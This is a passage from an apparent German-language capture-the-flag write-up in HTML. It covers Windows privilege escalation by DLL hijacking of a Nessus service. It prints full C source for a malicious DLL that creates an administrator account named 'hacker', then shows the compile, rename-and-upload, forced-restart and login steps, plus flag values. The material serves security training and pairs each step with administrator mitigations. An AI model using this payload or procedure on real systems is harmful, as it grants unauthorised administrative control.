+                <strong>Bewertung:</strong> Die Vorbereitung einer b&ouml;sartigen DLL f&uuml;r DLL-Hijacking ist ein g&auml;ngiger und oft erfolgreicher PE-Vektor auf Windows. Die Kompilierung mit Mingw stellt sicher, dass die DLL auf dem Windows-Ziel l&auml;uft. Der Plan, das Nessus-Verzeichnis f&uuml;r die Platzierung der DLL zu nutzen, ist solide, da Nessus mit hohen Rechten l&auml;uft.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Suche nach Diensten, die mit hohen Privilegien laufen und anf&auml;llig f&uuml;r DLL-Hijacking sind (laden DLLs aus Verzeichnissen mit schwachen Berechtigungen). Erstelle b&ouml;sartige DLLs, die bei Ausf&uuml;hrung einen neuen Administrator-Benutzer hinzuf&uuml;gen oder eine Reverse Shell starten. Nutze Mingw oder Visual Studio f&uuml;r die Kompilierung.
+                <br><strong>Empfehlung (Admin):</strong> Setze strikte Dateisystemberechtigungen f&uuml;r Programmverzeichnisse (insbesondere f&uuml;r Dienste, die mit SYSTEM/Administrator laufen). Implementiere Application Whitelisting, um die Ausf&uuml;hrung von nicht signierten oder unbekannten Bin&auml;rdateien in diesen Verzeichnissen zu verhindern. Überwache die Erstellung neuer Benutzer oder die &Auml;nderung von Gruppenmitgliedschaften.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+┌──(root㉿CCat)-[~] 
+└─# <span class="command">cat &lt;&lt; EOF &gt; hacker.c</span>
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+<span class="command">heredoc&gt; #include &lt;stdlib.h&gt;</span>
+<span class="command">#include &lt;windows.h&gt;</span>
+
+<span class="command">BOOL APIENTRY DllMain(</span>
+<span class="command">  HANDLE hModule,</span>
+<span class="command">  DWORD  ul_reason_for_call,</span>
+<span class="command">  LPVOID lpReserved)</span>
+<span class="command">{</span>
+<span class="command">    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {</span>
+<span class="command">        system(&quot;net user hacker hacker /add&quot;);</span>
+<span class="command">        system(&quot;net localgroup administrators hacker /add&quot;);</span>
+<span class="command">    }</span>
+<span class="command">    return TRUE;</span>
+<span class="command">}</span>
+<span class="command">EOF</span>
+</pre></div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+┌──(root㉿CCat)-[~] 
+└─# <span class="command">x86_64-w64-mingw32-gcc hacker.c -o legacy.dll --shared</span>
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+
+</pre></div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich f&uuml;hre die DLL-Hijacking-Ausnutzung &uuml;ber die Evil-WinRM Shell als Benutzer &#x27;nesus&#x27; durch. Zuerst navigiere ich in das Nessus-Installationsverzeichnis (<code>cd &quot;C:\Program Files\Tenable\Nessus&quot;</code>). Dann benenne ich die originale `legacy.dll` um (<code>mv legacy.dll legacy.dll.bak</code>), um meine b&ouml;sartige DLL an ihrer Stelle platzieren zu k&ouml;nnen. Ich lade meine kompilierte `legacy.dll` von meinem Kali-System in dieses Verzeichnis hoch (<code>upload /root/legacy.dll &quot;C:\Program Files\Tenable\Nessus\legacy.dll&quot;</code>). Die Evil-WinRM Ausgabe best&auml;tigt den erfolgreichen Upload. Schlie&szlig;lich starte ich den Computer neu (<code>restart-computer -force</code>), um den Nessus-Dienst und damit meine b&ouml;sartige DLL mit SYSTEM-Rechten neu zu starten.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Fantastisch! Die DLL-Hijacking-Vorbereitung und -Ausf&uuml;hrung wurde erfolgreich durchgef&uuml;hrt. Das Umbenennen der originalen DLL und das Hochladen der eigenen b&ouml;sartigen Version im Nessus-Verzeichnis wird bei Neustart des Nessus-Dienstes zur Ausf&uuml;hrung meines Codes (Hinzuf&uuml;gen eines neuen Administrators) f&uuml;hren. Die Notwendigkeit eines Neustarts ist eine Einschränkung, aber oft die einfachste Methode, einen Dienst zum Neuladen einer ge&auml;nderten DLL zu zwingen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Führe Dateisystem- und Berechtigungsprüfungen im Programmverzeichnis von Diensten durch, die mit hohen Rechten laufen. Suche nach umbenennbaren oder beschreibbaren DLLs, die von diesen Diensten beim Start geladen werden. F&uuml;hre DLL-Hijacking durch, um Code mit den Rechten des Dienstes auszuf&uuml;hren.
+                <br><strong>Empfehlung (Admin):</strong> Behebe Schreibberechtigungen f&uuml;r unprivilegierte Benutzer in kritischen Programmverzeichnissen. &Uuml;berwache Datei&auml;nderungen in diesen Verzeichnissen mit FIM. Überwache Neustarts von Systemen oder Diensten, insbesondere wenn zuvor Datei&auml;nderungen in kritischen Verzeichnissen stattgefunden haben. Implementiere Application Whitelisting.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+<span class="command">*Evil-WinRM* PS C:\Users\nesus\Documents&gt; cd &quot;C:\Program Files\Tenable\Nessus&quot;</span>
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+
+</pre></div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+<span class="command">*Evil-WinRM* PS C:\Program Files\Tenable\Nessus&gt; mv legacy.dll legacy.dll.bak</span>
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+
+</pre></div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+<span class="command">*Evil-WinRM* PS C:\Program Files\Tenable\Nessus&gt; ls</span>
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+
+    <span class="command">Directory: C:\Program Files\Tenable\Nessus</span>
+
+
+<span class="command">Mode                 LastWriteTime         Length Name</span>
+<span class="command">----                 -------------         ------ ----</span>
+<span class="command">-a----        10/18/2024  10:35 AM              1 .winperms</span>
+<span class="command">-a----          5/9/2024  11:30 PM        2471544 fips.dll</span>
+<span class="command">-a----          5/9/2024  11:30 PM        5217912 icudt73.dll</span>
+<span class="command">-a----          5/9/2024  11:30 PM        1575032 icuuc73.dll</span>
+<span class="command">-a----          5/9/2024  11:30 PM        4988536 legacy.dll.bak</span>
+<span class="command">-a----          5/9/2024  11:06 PM         375266 License.rtf</span>
+<span class="command">-a----          5/9/2024  11:37 PM       11204728 nasl.exe</span>
+<span class="command">-a----          5/9/2024  11:31 PM         264824 ndbg.exe</span>
+<span class="command">-a----          5/9/2024  11:06 PM             46 Nessus Web Client.url</span>
+<span class="command">-a----          5/9/2024  11:33 PM          38520 nessus-service.exe</span>
+<span class="command">-a----          5/9/2024  11:37 PM       11143800 nessuscli.exe</span>
+<span class="command">-a----          5/9/2024  11:38 PM       11925624 nessusd.exe</span>
+</pre></div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+<span class="command">*Evil-WinRM* PS C:\Program Files\Tenable\Nessus&gt; upload /root/legacy.dll &quot;C:\Program Files\Tenable\Nessus\legacy.dll&quot;</span>
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+<span class="command">                                        </span>
+<span class="password">Info: Uploading /root/legacy.dll to C:\Program Files\Tenable\Nessus\legacy.dll</span>
+<span class="password">                                        </span>
+<span class="password">Data: 114024 bytes of 114024 bytes copied</span>
+<span class="password">                                        </span>
+<span class="password">Info: Upload successful!</span>
+</pre></div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+<span class="command">*Evil-WinRM* PS C:\Program Files\Tenable\Nessus&gt; restart-computer -force</span>
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+
+</pre></div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Nach dem Neustart des Zielsystems, der meine b&ouml;sartige `legacy.dll` ausl&ouml;sen sollte, versuche ich, mich mit dem neu erstellten Benutzer &#x27;hacker&#x27; über Evil-WinRM anzumelden (<code>evil-winrm -i 192.168.2.66 -u hacker -p &#x27;hacker&#x27;</code>). Beachte wieder die m&ouml;gliche Tippfehler-IP 192.168.2.66. Wichtig ist: Der Login ist erfolgreich! Ich erhalte eine neue Evil-WinRM Shell. Ich best&auml;tige meinen Benutzernamen mit <code>whoami</code> und sehe <span class="command">nessus\hacker</span>. Das bedeutet, das Konto wurde erfolgreich erstellt und ist dem System beigetreten.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Fantastisch! Der Login mit dem durch DLL-Hijacking erstellten Benutzer 'hacker' war erfolgreich. Das Konto 'hacker' wurde, wie in meiner b&ouml;sartigen DLL programmiert, erstellt und der Administratoren-Gruppe hinzugef&uuml;gt. Ich habe nun administrativen Zugriff auf das System über das neue Konto.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nach erfolgreicher DLL-Hijacking-Ausf&uuml;hrung (die einen neuen User erstellt oder eine Shell startet), logge dich mit den neuen Anmeldedaten ein oder nutze die erlangte Shell. Best&auml;tige immer deine Rechte.
+                <br><strong>Empfehlung (Admin):</strong> Überwache Systemereignisse auf neue Benutzerkonten oder Änderungen der Gruppenmitgliedschaften, insbesondere solche, die von verd&auml;chtigen Prozessen (z.B. Nessus-Dienst, wenn er kompromittiert ist) initiiert werden. Überwache Logins mit neuen oder unbekannten Konten.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+┌──(root㉿CCat)-[~] 
+└─# <span class="command">evil-winrm -i 192.168.2.66 -u hacker -p &#x27;hacker&#x27;</span>
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+<span class="command">                                        </span>
+<span class="command">Evil-WinRM shell v3.7</span>
+<span class="command">                                        </span>
+<span class="command">Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline</span>
+<span class="command">                                        </span>
+<span class="command">Data: For more information, check Evil-WinRM GitHub: [Link: https://github.com/Hackplayers/evil-winrm#Remote-path-completion | Ziel: https://github.com/Hackplayers/evil-winrm#Remote-path-completion]</span>
+<span class="command">                                        </span>
+<span class="password">Info: Establishing connection to remote endpoint</span>
+<span class="password">                                        </span>
+<span class="command">*Evil-WinRM* PS C:\Users\hacker\Documents&gt;</span> 
+</pre></div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+<span class="command">*Evil-WinRM* PS C:\Users\hacker\Documents&gt; whoami</span>
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+<span class="command">nessus\hacker</span>
+</pre></div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> In der Evil-WinRM Shell als Administrator-Benutzer &#x27;hacker&#x27; navigiere ich zum Desktop-Verzeichnis des Administrator-Profils (<code>cd ..\..</code>, dann <code>cd Administrator</code>). Mit <code>ls</code> liste ich den Inhalt auf und sehe das Verzeichnis <span class="command">Desktop</span>. Ich wechsle in das Desktop-Verzeichnis (<code>cd Desktop</code>) und lese den Inhalt der Datei <span class="command">root.txt</span> mit <code>cat Desktop\root.txt</code>. Die Ausgabe ist <span class="password">b5fc5a4ebfc20cc18220a814e1aee0aa</span>.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Fantastisch! Ich habe die Root-Flag als neu erstellter Administrator-Benutzer gefunden und ausgelesen. Das DLL-Hijacking-Problem und die schwachen Dateisystemberechtigungen im Nessus-Verzeichnis, die mir das Platzieren der b&ouml;sartigen DLL erm&ouml;glichten, waren der Weg zum Root-Zugriff auf dem System.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutze den erlangten Administrator-Zugriff, um auf alle Bereiche des Systems zuzugreifen, insbesondere die Home-Verzeichnisse anderer Benutzer (inkl. Administrator) auf Root-Flags oder sensible Daten.
+                <br><strong>Empfehlung (Admin):</strong> Wie im POC beschrieben, behebe die DLL-Hijacking-Schwachstelle, sichere Datei- und Ordnerberechtigungen streng ab und &uuml;berwache Systemänderungen (Benutzer, Gruppen, Logins).
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+<span class="command">*Evil-WinRM* PS C:\Users\hacker\Documents&gt; cd ..\..</span>
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+<span class="command">*Evil-WinRM* PS C:\Users&gt;</span> 
+</pre></div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+<span class="command">*Evil-WinRM* PS C:\Users&gt; ls</span>
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+
+    <span class="command">Directory: C:\Users</span>
+
+
+<span class="command">Mode                 LastWriteTime         Length Name</span>
+<span class="command">----                 -------------         ------ ----</span>
+<span class="command">d-----        10/18/2024  10:08 PM                Administrator</span>
+<span class="command">d-----         6/28/2025   2:26 PM                hacker</span>
+<span class="command">d-----         6/28/2025   2:06 PM                nesus</span>
+<span class="command">d-r---         6/15/2024  10:54 AM                Public</span>
+</pre></div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+<span class="command">*Evil-WinRM* PS C:\Users&gt; cd Administrator</span>
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+<span class="command">*Evil-WinRM* PS C:\Users\Administrator&gt;</span> 
+</pre></div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+<span class="command">*Evil-WinRM* PS C:\Users\Administrator&gt; ls</span>
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+
+    <span class="command">Directory: C:\Users\Administrator</span>
+
+
+<span class="command">Mode                 LastWriteTime         Length Name</span>
+<span class="command">----                 -------------         ------ ----</span>
+<span class="command">d-r---         6/15/2024  10:54 AM                3D Objects</span>
+<span class="command">d-r---         6/15/2024  10:54 AM                Contacts</span>
+<span class="command">d-r---        10/18/2024  12:11 PM                Desktop</span>
+<span class="command">d-r---        10/18/2024   5:42 PM                Documents</span>
+<span class="command">d-r---         6/15/2024  10:54 AM                Downloads</span>
+<span class="command">d-r---         6/15/2024  10:54 AM                Favorites</span>
+<span class="command">d-r---         6/15/2024  10:54 AM                Links</span>
+<span class="command">d-r---         6/15/2024  10:54 AM                Music</span>
+<span class="command">d-r---         6/15/2024  10:54 AM                Pictures</span>
+<span class="command">d-r---         6/15/2024  10:54 AM                Saved Games</span>
+<span class="command">d-r---         6/15/2024  10:54 AM                Searches</span>
+<span class="command">d-r---         6/15/2024  10:54 AM                Videos</span>
+</pre></div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+<span class="command">*Evil-WinRM* PS C:\Users\Administrator&gt; cat Desktop\root.txt</span>
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+<span class="password">b5fc5a4ebfc20cc18220a814e1aee0aa</span>
+</pre></div>
+            </div>
+        </section>
+
+        <section id="flags">
+            <h2>Flags</h2>
+            <!-- Hier die Flags einfügen -->
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+
+                <div class="flag-entry">
+                    <div class="flag-command">cat C:\Users\nesus\Desktop\user.txt</div>
+                    <div class="flag-value"><span class="password">72113f41d43e88eb5d67f732668bc3d1</span></div>
+                </div>
+
+                <div class="flag-entry">
+                    <div class="flag-command">cat C:\Users\Administrator\Desktop\root.txt</div>
+                    <div class="flag-value"><span class="password">b5fc5a4ebfc20cc18220a814e1aee0aa</span></div>
+                </div>
+            </div>
+        </section>
+
+    <footer class="footer">
+        <p>Ben Chehade - Cyber Security Reports</p>
+        <p>Berichtsdatum: 01. Juli 2025</p>
+    </footer>
+</body>
+</html>
